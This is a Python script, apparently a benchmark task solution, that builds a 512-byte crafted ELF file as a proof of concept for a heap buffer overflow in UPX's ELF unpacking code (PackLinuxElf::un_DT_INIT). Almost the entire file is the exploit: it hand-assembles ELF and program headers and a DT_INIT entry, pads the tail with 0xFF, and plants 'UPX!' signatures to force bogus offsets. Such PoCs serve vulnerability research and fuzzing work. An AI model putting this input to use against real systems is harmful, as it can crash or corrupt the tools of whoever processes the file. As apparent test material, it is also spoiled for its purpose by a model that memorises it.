import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a 512-byte PoC file
        data = bytearray(512)
        
        # --- ELF Header (64-bit, Little Endian) ---
        # e_ident: Magic \x7fELF, Class 2 (64-bit), Data 1 (LE), Version 1, OSABI 0 (SysV)
        # Padded with zeros
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        data[0:16] = e_ident
        
        # e_type=2 (ET_EXEC), e_machine=62 (EM_X86_64), e_version=1
        struct.pack_into('<HHI', data, 16, 2, 62, 1)
        
        # e_entry=0x400000, e_phoff=64 (Program Header offset), e_shoff=0
        struct.pack_into('<QQQ', data, 24, 0x400000, 64, 0)
        
        # e_flags=0, e_ehsize=64, e_phentsize=56, e_phnum=2 (LOAD + DYNAMIC)
        # e_shentsize=64, e_shnum=0, e_shstrndx=0
        struct.pack_into('<IHHHHHH', data, 52, 0, 64, 56, 2, 64, 0, 0)
        
        # --- Program Headers ---
        ph_off = 64
        
        # PH1: PT_LOAD
        # p_type=1, p_flags=7 (RWE), p_offset=0, p_vaddr=0x400000
        # p_paddr=0x400000, p_filesz=512, p_memsz=512, p_align=0x1000
        struct.pack_into('<IIQQQQQQ', data, ph_off, 1, 7, 0, 0x400000, 0x400000, 512, 512, 0x1000)
        
        # PH2: PT_DYNAMIC
        # p_type=2, p_flags=6 (RW), p_offset=0x100 (256)
        # p_vaddr=0x400100, p_paddr=0x400100, p_filesz=64, p_memsz=64, p_align=8
        ph_off += 56
        struct.pack_into('<IIQQQQQQ', data, ph_off, 2, 6, 256, 0x400100, 0x400100, 64, 64, 8)
        
        # --- Dynamic Section ---
        # Located at offset 256 (0x100)
        dyn_off = 256
        
        # DT_INIT (Tag 12), Value 0x400000
        struct.pack_into('<QQ', data, dyn_off, 12, 0x400000)
        # DT_NULL (Tag 0), Value 0
        struct.pack_into('<QQ', data, dyn_off + 16, 0, 0)
        
        # --- UPX Injection ---
        # The vulnerability involves PackLinuxElf::un_DT_INIT and unsafe usage of lowmem.
        # To trigger this, the file must be identified as UPX packed.
        # UPX searches for the "UPX!" signature near the end of the file (l_info structure).
        
        # Fill the end of the file with 0xFF.
        # This serves two purposes:
        # 1. It acts as valid padding/data.
        # 2. When UPX parses the headers (l_info, p_info) surrounding the magic, 
        #    it reads 0xFFFFFFFF, which interpreted as offsets/sizes (like xct_off) 
        #    will cause Heap Buffer Overflow or unsafe access to lowmem.
        for i in range(400, 512):
            data[i] = 0xFF
            
        # Write "UPX!" magic.
        # UPX usually expects l_info at the end. sizeof(l_info) is typically 12 bytes.
        # We place "UPX!" at 512 - 12 = 500.
        data[500:504] = b'UPX!'
        
        # We also place "UPX!" at 512 - 36 (476) to cover cases where an overlay offset exists.
        data[476:480] = b'UPX!'
        
        return bytes(data)